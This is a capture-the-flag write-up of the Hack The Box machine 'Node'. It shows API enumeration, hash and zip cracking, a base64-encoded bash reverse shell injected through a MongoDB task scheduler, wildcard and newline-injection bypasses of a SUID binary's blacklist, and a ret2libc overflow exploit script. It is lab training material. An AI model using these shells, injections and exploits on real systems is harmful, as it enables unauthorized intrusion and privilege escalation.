# Node
>Author : Xyan1d3
>Date : 5th July 2021
>IP : 10.10.10.58
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sat Jul  3 13:54:42 2021 as: nmap -sC -sV -v -oN nmap/node 10.10.10.58
Nmap scan report for 10.10.10.58
Host is up (0.082s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration
We take a look on the website and find out that it is hosting a site.
```
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/node]
└──╼ # curl --head 10.10.10.58:3000
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Sat, 02 Sep 2017 11:27:58 GMT
ETag: W/"f15-15e4258ef70"
Content-Type: text/html; charset=UTF-8
Content-Length: 3861
Date: Sat, 03 Jul 2021 15:18:39 GMT
Connection: keep-alive
```

The box is running a `node.js` application. 
We check the login request on the login page and find out that it is doing a post request on `/api/session/authenticate`.

We could run a `gobuster` on the api directory to fuzz all the available api features.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/node]
└──╼ # gobuster dir -u http://10.10.10.58:3000/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 3861
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.58:3000/api/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3861
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/03 21:06:47 Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 200) [Size: 611]
/session              (Status: 200) [Size: 23]
```

On, Fuzzing we find out an api called `users` which we might want to take a look at.
```json
[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
```

We have 4 usernames and 4 hashes out of which `myP14ceAdm1nAcc0uNT` is an admin account.

We crack those hashes and find out that we could crack only 3 hashes out of 4 hashes.
![[Pasted image 20210703212654.png]]

|Username|Hash|Password|Admin|
|--|--|--|--|
|myP14ceAdm1nAcc0uNT|dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0|manchester|x|af
|tom|f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240|spongebob|x|
|mark|de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73|snowflake|x|
|rastating|5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0|CANNOT CRACK|x|

We login to the login page with the admin user credentials and find out that we have a download backup option.
On downloading the file we see that it is a txt file with very big base64 lines which we base64 decode and find out that it is a zip file contents. It also, turns out that the zip is encrypted which we do a `zip2john` and JTR against to unlock it and crack the zip hash.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/node]
└──╼ # zip2john backup.zip >zip_hash
backup.zip/var/www/myplace/ is not encrypted!
*** SNIP ***

┌─[Magisk@Xyan1d3]─[10.10.14.9]─[~/htb/node]
└──╼ # john zip_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (backup.zip)
1g 0:00:00:00 DONE (2021-07-03 21:37) 16.66g/s 3072Kp/s 3072Kc/s 3072KC/s sandrea..joan08
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We find out that the credentials of the zip file is `magicword`.

On unziping We, find out that the files inside are the files of the `nodejs` application.
On taking a look at the `app.js` file we find out the database credentials.
![[Pasted image 20210703214804.png]]
```js
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn       = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

Database Credentials.

|Username|Password|
|--|--|
|mark|5AYRft73VtFpc84k|

We could now use the credentials to SSH into the machines.

# Initial FootHold
We could use the database creds to SSH into the box.
![[Pasted image 20210703215216.png]]

# User Escalation to tom user
We run `linpeas.sh` to find out that we have a `/var/scheduler` directory which is running another node application.
```js
mark@node:~$ cat /var/scheduler/app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);
```

It looks for any key of `cmd` in the database and executes the value in bash.
That, means we could login to that `collection` and create a key named `cmd` and inject a command as a key.

```js
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost/scheduler
MongoDB shell version: 3.2.16
connecting to: localhost/scheduler
> db.tasks.insert({cmd:"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45Lzg4ODggMD4mMQ== |base64 -d|bash"})
WriteResult({ "nInserted" : 1 })
```

After, Waiting a couple of seconds we recieve a shell back as the user `tom`.
![[Pasted image 20210703231130.png]]

## Getting the user Flag
```python
tom@node:/$ cd /home/tom/
tom@node:~$ ls -l
total 4
-rw-r----- 1 root tom 33 Sep  3  2017 user.txt
tom@node:~$ cat user.txt 
e1156acc3574e04b06908ecf76be91b1
```

# Root Escalation
We are in a group called `admin`
```python
tom@node:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

There is a binary on the box on `/usr/bin/local/backup` which is a `suid` binary which is user owned by `root` and group owned by `admin`.
```
tom@node:~$ ls -l /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

We transfer the binary on our box.
On decompiling we immediately with `ghidra` and find out that we have a `argc` and `argv`. 
![[Pasted image 20210704231329.png]]

The main function takes two parameters which are `argc` and `argv` as confirmed by looking how the 1st parameter and 2nd parameter's are handled in the program.
![[Pasted image 20210705002626.png]]

From, The handling we find out that the `param_1` is the `argc` which is <4 that means the program takes 3 arguments maximum. And as from the `argv` we find out that it is a integer pointer to the `argv` array.

We also have a hardcoded `base64` chunk which is repeated many times in the binary.
![[Pasted image 20210705003731.png]]
On decoding we find out that it is a zip file which contains a `root.txt` inside encrypted with `magicword` password which is a `trollface`.

**The Binary essentially checks for 1st argument with can be `-q` stands for quiet and does not print the banner. In 2nd argument it takes a key from the `/etc/myplace/keys` and the third argument as the file we want to backup which is done by passing it to the zip command and zipped with password `magicword` and then displayed after base64 encoding it. There is also some blacklisting taking place here which displays the hardcoded base64'ed trollface chunk when any of the bad chars are entered for doing a backup.**

By doing an `ltrace` on the `backup` binary with some arbitrary arguments.
```
tom@node:~$ ltrace backup a b c
__libc_start_main(0x80489fd, 4, 0xffc22864, 0x80492c0 <unfinished ...>

*** SNIP ***

strncpy(0xffc22728, "b", 100)                                = 0xffc22728
strcpy(0xffc22711, "/")                                      = 0xffc22711
strcpy(0xffc2271d, "/")                                      = 0xffc2271d
strcpy(0xffc226a7, "/e")                                     = 0xffc226a7
strcat("/e", "tc")= "/etc"
strcat("/etc", "/m")                                         = "/etc/m"
strcat("/etc/m", "yp")                                       = "/etc/myp"
strcat("/etc/myp", "la")                                     = "/etc/mypla"
strcat("/etc/mypla", "ce")                                   = "/etc/myplace"
strcat("/etc/myplace", "/k")                                 = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                               = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                              = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                              = 0x880d410
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x880d410)= 0xffc222bf
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")         = 64
strcmp("b", "a01a6aa5aaf1d7729f35c8278daae30f"...)           = 1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x880d410)= 0xffc222bf
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")         = 64
strcmp("b", "45fac180e9eee72f4fd2d9386ea7033e"...)           = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x880d410)= 0xffc222bf
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")         = 64
strcmp("b", "3de811f4ab2b7543eaf45df611c2dd25"...)           = 1
fgets("\n", 1000, 0x880d410)                                 = 0xffc222bf
strcspn("\n", "\n")                                          = 0
strcmp("b", "")   = 1
```

We find out that the it is opening a file called `/etc/myplace/keys` as readonly and is doing a string compare with any key in the file.
```python
tom@node:~$ cat /etc/myplace/keys 
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

We now, open the binary in  `ida` and find out that there are some blacklisted characters which when found in the file path it prints the trollface base64 chunk.
![[Pasted image 20210705004409.png]]
![[Pasted image 20210705004435.png]]
![[Pasted image 20210705004505.png]]
![[Pasted image 20210705004543.png]]
![[Pasted image 20210705004622.png]]
![[Pasted image 20210705004712.png]]
![[Pasted image 20210705004757.png]]
![[Pasted image 20210705004841.png]]
![[Pasted image 20210705004936.png]]
![[Pasted image 20210705005004.png]]

From, These call graphs given above we can see that if the file contains those bad characters it prints out the troll.
```txt
..
/root
;
&
`
$
|
//
/
/etc
```

But, The problem here is we could use an `wildcard` in bash to get the flag.
We could use something like `/roo*/roo*` ,`/roo?/r???.txt` to get the `root.txt` or regex like `/roo[a-z]/roo[a-z].txt` to get the flag as those are aparently not a bad character.

## `*` wildcard method
**This is what I personally did as it came to my mind.**
```python
tom@node:~$ backup magisk 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /roo*/roo*.txt

*** SNIP ***

 [+] Validated access token
 [+] Starting archiving /roo*/roo*.txt
 [+] Finished! Encoded backup is below:

UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXPx4WB1eAsAAQQAAAAABAAAAAAHxxTUNPqEzMpUtCvNrfQoqnu+dsyNap7+9OcxmY7lzZw6i/+460ukEApB5/1QSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
```

## `?` wildcard method 
```python
tom@node:~$ backup magisk 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r??t/r???.txt

*** SNIP ***

 [+] Validated access token
 [+] Starting archiving /r??t/r???.txt
 [+] Finished! Encoded backup is below:

UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXPx4WB1eAsAAQQAAAAABAAAAAD0SQ/g+nvtrCkTrJbiaJDkVRPpDTO8n4H9nD+1NdVPZm7nWAyjeVk7kJRXwLFQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
```

## regex method
```python
tom@node:~$ backup magisk 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /roo[a-z]/roo[a-z].txt

*** SNIP ***

 [+] Validated access token
 [+] Starting archiving /roo[a-z]/roo[a-z].txt
 [+] Finished! Encoded backup is below:

UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXPx4WB1eAsAAQQAAAAABAAAAACADA20VY5TmZ9AkXETvidpIV4GF60AeWXZrb50mh1oZ2ef6JOVynrXWRh47tNQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
```

## Bash multi-line injection
**Full credits to `0xdf` for this method as I, completely forgot about this behaviour of bash.**
```python
tom@node:~$ backup magisk 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "abc
> bash
> "

*** SNIP ***

 [+] Validated access token
 [+] Starting archiving abc
bash

        zip warning: name not matched: abc 

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_2020787766 . -i abc)
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@node:~#
```

## Intended route the `ret2libc` BOF exploit
The binary is not compiled with `ASLR` but system wide `ASLR` is on that means the address of `libc` is always changing. The binary also as `NX` that means we cannot put shellcode on the stack and jump to it and execute it.

That leaves us with only with `ret2libc`.
The file path is using a `strcmp` which is bufferoverflowable and can successfully overflow the `$eip` which is at the offset `512`. We could now get the `libc` address using `ldd` on the binary and get the offsets of the `system`, `exit` by using `readelf -s` on the `libc` and the address of `/bin/sh` using `strings -atx` on the `libc` and grepping for `/bin/sh`.
We have to run this exploit on a while True loop to bruteforce `ASLR` and get a shell.

The exploit code (copied from hackthebox official writeup)
```python
import struct, subprocess
libc = 0xf75e2000
sysOffset = 0x0003a940
sysAddress = libc + sysOffset
exitOffset = 0x0002e7b0
exitAddress = libc + exitOffset
binsh = libc + 0x0015900b
payload = "A" * 512
payload += struct.pack("<I", sysAddress)
payload += struct.pack("<I", exitAddress)
payload += struct.pack("<I", binsh)
attempts = 0
while True:
	attempts += 1
	print "Attempts: " + attempts
	subprocess.call(["/usr/local/bin/backup", "-i","3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110",payload]
```


## Getting the root Flag
```python
root@node:~# id
uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
root@node:~# cd /root/
root@node:/root# ls -l
total 4
-rw-r----- 1 root root 33 Sep  3  2017 root.txt
root@node:/root# cat root.txt 
1722e99ca5f353b362556a62bd5e6be0
```